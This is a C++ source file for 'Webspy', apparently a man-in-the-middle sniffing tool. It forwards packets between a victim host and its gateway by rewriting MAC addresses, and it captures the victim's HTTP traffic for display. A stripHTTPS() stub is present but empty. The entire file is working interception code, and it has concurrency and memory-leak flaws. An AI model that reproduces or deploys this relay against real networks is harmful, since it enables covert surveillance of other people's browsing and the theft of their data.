/*
 * Pipe.cpp
 *
 *  Created on: 01/06/2015
 *      Author: Felipe Rodopoulos
 */

#include "Pipe.h"

std::queue<Packet>	Pipe::gatewayBuffer;
std::queue<Packet>	Pipe::victimBuffer;
pthread_mutex_t 	Pipe::victimMutex;
pthread_mutex_t 	Pipe::gatewayMutex;
Crafter				Pipe::victimCrafter;
Crafter				Pipe::gatewayCrafter;
Renderer*			Pipe::renderer;

Pipe::Pipe() : snifferThread(0), victimThread(0), gatewayThread(0){}

Pipe::~Pipe(){}

void Pipe::init(Renderer* rendererPtr){
	victimCrafter.init(Globals::iface);
	gatewayCrafter.init(Globals::iface);
	renderer = rendererPtr;

	if(pthread_mutex_init(&victimMutex, NULL) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
		exit(EXIT_FAILURE);
	}
	if(pthread_create(&victimThread, nullptr, routeToVictim, nullptr) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init victim relayer thread\n");
		exit(EXIT_FAILURE);
	}

	if(pthread_mutex_init(&gatewayMutex, NULL) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
		exit(EXIT_FAILURE);
	}
	if(pthread_create(&gatewayThread, nullptr, routeToGateway, nullptr) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init gateway relayer thread\n");
		exit(EXIT_FAILURE);
	}

	if(pthread_create(&snifferThread, nullptr, connect, nullptr) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
		exit(EXIT_FAILURE);
	}
}

void* Pipe::connect(void* args){
	char filter[] = "tcp port 80 || tcp port 53 || udp port 53";
	Sniffer sniffer(filter);

	sniffer.listen(relay);
	return nullptr;
}

void Pipe::relay(u_char* args, const struct pcap_pkthdr* header, const unsigned char* packet){
	if(!header) return;
	Packet* rcvdPacket = new Packet(packet, header->len);
	if(!memcmp(Globals::attacker.mac, rcvdPacket->ethernet->thaddr, 6)){
		// Adding packets to the victim queue (send them to the gateway)
		if(!memcmp(rcvdPacket->ethernet->shaddr, Globals::victim.mac->ether_addr_octet,6)){
			pthread_mutex_lock(&victimMutex);
			victimBuffer.push(*rcvdPacket);
			pthread_mutex_unlock(&victimMutex);

		// Adding packets to the gateway queue (send them to the victim)
		} else if(!memcmp(rcvdPacket->ethernet->shaddr, Globals::gateway.mac->ether_addr_octet, 6)
				&& rcvdPacket->ip->dst != Globals::attacker.ip){
			if(!rcvdPacket->isHTTP()){
				pthread_mutex_lock(&gatewayMutex);
				gatewayBuffer.push(*rcvdPacket);
				pthread_mutex_unlock(&gatewayMutex);
			} else{
				printf("[HTTP] Len: %d\n", rcvdPacket->len);
				HTTP* httpData = new HTTP(rcvdPacket->getPayload(), rcvdPacket->getPayloadLen());
				pthread_mutex_lock(&renderer->rendererMutex);
				renderer->rendererBuffer.push(*httpData);
				pthread_mutex_unlock(&renderer->rendererMutex);
			}
		}
	}
}

void* Pipe::routeToVictim(void* args){
	while(1 == 1){
		if(!gatewayBuffer.empty()){
			pthread_mutex_lock(&gatewayMutex);
			Packet packet = gatewayBuffer.front();
			gatewayBuffer.pop();
			pthread_mutex_unlock(&gatewayMutex);

			Ethernet* ether = (Ethernet*) packet.data;
			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
			memcpy(ether->thaddr, Globals::victim.mac->ether_addr_octet, 6);

			//printf("[packet] attacker -> victim  | Len: %d\n", packet.len);
			gatewayCrafter.sendRaw(packet);
		}
	}
}

void* Pipe::routeToGateway(void* args){
	while(1 == 1){
		if(!victimBuffer.empty()){
			pthread_mutex_lock(&victimMutex);
			Packet packet = victimBuffer.front();
			victimBuffer.pop();
			pthread_mutex_unlock(&victimMutex);

			Ethernet* ether = (Ethernet*) packet.data;
			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
			memcpy(ether->thaddr, Globals::gateway.mac->ether_addr_octet, 6);

			//printf("[packet] attacker -> gateway | Len: %d\n", packet.len);
			victimCrafter.sendRaw(packet);
		}
	}
}

void Pipe::stripHTTPS(){

}
